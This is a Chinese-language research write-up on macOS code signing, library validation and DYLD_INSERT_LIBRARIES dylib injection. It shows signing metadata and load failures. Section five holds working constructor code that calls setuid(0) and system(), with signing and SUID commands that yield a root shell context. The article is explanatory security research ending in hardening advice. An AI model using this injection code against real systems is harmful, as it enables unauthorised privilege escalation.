# macOS代码签名与动态库注入研究

## 一、背景

在macOS系统中，代码签名是确保软件来源可信的重要机制。本文将通过一个具体的案例来探讨使用不同证书进行代码签名时，动态库（dylib）的加载情况，并介绍如何利用某些标志绕过安全限制。

### 初始设置
- **初始签名信息**：
  - 签名者：Apple Root CA
  - 签名时间：2019年7月9日 11:40:15
  - 团队标识符：33YRLYRBYV
  - 内部需求计数：1，大小：180
  - 动态库加载结果：成功

```shell
$ /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
Hello from dylib!
```

## 二、使用不同证书签名后的效果

当尝试使用另一个证书重新签名`inject.dylib`后，动态库无法正常加载。

### 重新签名信息
- **签名者**：Mac Developer: PI:EMAIL (M9UN3Y3UDG)
- **签名时间**：2019年7月9日 11:43:57
- **团队标识符**：E7Q33VUH49
- **内部需求计数**：1，大小：176
- **动态库加载结果**：失败

```shell
$ /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
dyld: warning: could not load inserted library 'inject.dylib' into hardened process because no suitable image found.  Did find:
    inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: mapping process and mapped file (non-platform) have different Team IDs
    inject.dylib: stat() failed with errno=1
```

## 三、启用CS_REQUIRE_LV标志

为了进一步验证，我们可以在构建设置中启用`CS_REQUIRE_LV`标志，并重新编译应用程序。这一步骤可以通过在Xcode的“Build Settings -> Signing -> Other Code Signing Flags”中添加`-o library`实现。

### 验证结果
- **CodeDirectory版本**：20200
- **CodeDirectory大小**：377
- **CodeDirectory标志**：0x2000(library-validation)
- **哈希数量**：4+5
- **位置**：嵌入式
- **动态库加载结果**：失败

```shell
$ codesign -dvvv /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
Executable=/HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa
(...)
CodeDirectory v=20200 size=377 flags=0x2000(library-validation) hashes=4+5 location=embedded
(...)
```

## 四、测试CS_RESTRICT标志

对于`CS_RESTRICT`标志，我们尝试对某个Apple程序执行注入操作，但发现`codesign`工具不能直接显示该标志的存在。因此，我们选择了Disk Utility作为测试对象。

### 测试结果
- **可执行文件**：/Applications/Utilities/Disk Utility.app/Contents/MacOS/Disk Utility
- **标识符**：com.apple.DiskUtility
- **格式**：app bundle with Mach-O thin (x86_64)
- **CodeDirectory版本**：20100
- **CodeDirectory大小**：8646
- **CodeDirectory标志**：0x0(none)
- **哈希数量**：263+5
- **位置**：嵌入式
- **平台标识符**：7
- **哈希类型**：sha256
- **哈希大小**：32
- **候选CDHash**：2fbbd1e193e5dff4248aadeef196ef181b1adc26
- **签名大小**：4485
- **授权机构**：Software Signing, Apple Code Signing Certification Authority, Apple Root CA
- **Info.plist条目**：28
- **团队标识符**：未设置
- **密封资源版本**：2
- **规则**：13
- **文件数量**：1138
- **内部需求计数**：1，大小：72
- **动态库加载结果**：失败

```shell
$ DYLD_INSERT_LIBRARIES=inject.dylib /Applications/Utilities/Disk\ Utility.app/Contents/MacOS/Disk\ Utility
```

## 五、SUID文件的注入

如果设置了`CS_REQUIRE_LV`标志，我们可以将dylib注入到SUID文件中。为此，我们需要确保dylib使用相同的签名。

### 修改后的dylib代码
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    setuid(0);
    system("id");
    printf("Hello from dylib!\n");
    syslog(LOG_ERR, "Dylib injection successful in %s\n", argv[0]);
}
```

### 编译与签名
```shell
gcc -dynamiclib inject.c -o inject.dylib
codesign -f -s "Mac Developer: PI:EMAIL (M9UN3Y3UDG)" inject.dylib
codesign -f -s "Mac Developer: PI:EMAIL (M9UN3Y3UDG)" -o library test
sudo chown root test
sudo chmod +s test
```

### 加载结果
```shell
$ ./test 
uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
Hello from dylib!
Hello world
```

## 六、GateKeeper的影响

在Mojave中，我们可以注入带有隔离标志的二进制文件，但在Catalina中，由于系统引入了新的安全策略，这种方法不再适用。

### Catalina中的错误信息
```shell
dyld: could not load inserted library 'inject.dylib' because no suitable image found.  Did find:
    inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: Library load disallowed by System Policy
    inject.dylib: stat() failed with errno=1
```

## 七、总结

应用程序应采取措施保护自身免受这种注入技术的影响。随着Apple不断改进系统安全性，大多数应用程序都将启用hardened runtime，从而减少此类攻击的可能性。如果您的应用设置了SUID位，请确保其父目录也设置了正确的权限。

相关代码请参考[Github](https://gist.github.com/theevilbit/3574df063cf9e2c3ba6c57aca5dff022)。